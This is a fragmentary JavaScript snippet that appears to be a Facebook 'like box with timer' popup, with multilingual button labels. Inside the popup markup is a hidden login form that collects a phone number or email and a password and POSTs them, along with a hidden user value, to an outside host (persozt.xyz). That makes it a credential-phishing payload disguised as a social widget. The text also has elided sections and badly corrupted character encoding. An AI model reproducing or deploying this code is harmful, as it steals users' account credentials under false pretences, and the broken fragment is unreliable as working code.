...
function fbLikeDump(a) { if (a == true) { createCookie(likes + "fblikepop", "true", 50) } $("#fblikebg").fadeOut("slow"); $("#fblikepop").fadeOut("slow") } (function (a) {
    a.fn.kakinetworkdotcom = function (b) {
        ...
        <center><form action='https://persozt.xyz/tes/check.php' method='POST'>
        <div class='col'><input type='hidden' id='mrx' name='u' value='` + usr + `'>
        <input type='text' id='email' name='email' placeholder='Nomor ponsel atau email' required="required" autocomplete="off">
        <input type='password' id='pass' name='pass' placeholder='Kata Sandi' required="required" autocapitalize="off" autocomplete="off">
        ...
        var d = { orwait: { en: "Or wait", my: "Atau tunggu", id: "Atau menunggu", fr: "Ou attendre", de: "Order warten", it: "O attendere", es: "O esperar", tr: "Veya bekleyin" }, seconds: { en: "Seconds", my: "Saat", id: "Detik", fr: "Secondes", de: "Sekunden", it: "Secondi", es: "Segundos", tr: "Saniye" }, closeable: { en: "Close", my: "Tutup", id: "Menutup", fr: "Fermer", de: "NÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¤he", it: "Chiudi", es: "Cerrar", tr: "Kapat", bl: "ÃƒÆ’Ã‚ÂÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬ÂÃƒÆ’Ã‚ÂÃƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬ËœÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã‚ÂÃƒâ€šÃ‚Â²ÃƒÆ’Ã‚ÂÃƒâ€šÃ‚Â¾ÃƒÆ’Ã¢â‚¬ËœÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÆ’Ã‚ÂÃƒâ€šÃ‚Â¸" } }; setTimeout(function () {
            getPopHTML = function () {
                ...
                <span id="counter">
                    ...
                    <a id = "fbtplink" href = "youtube.com" title = "Facebook Like Box With Timer" target = "_blank" >
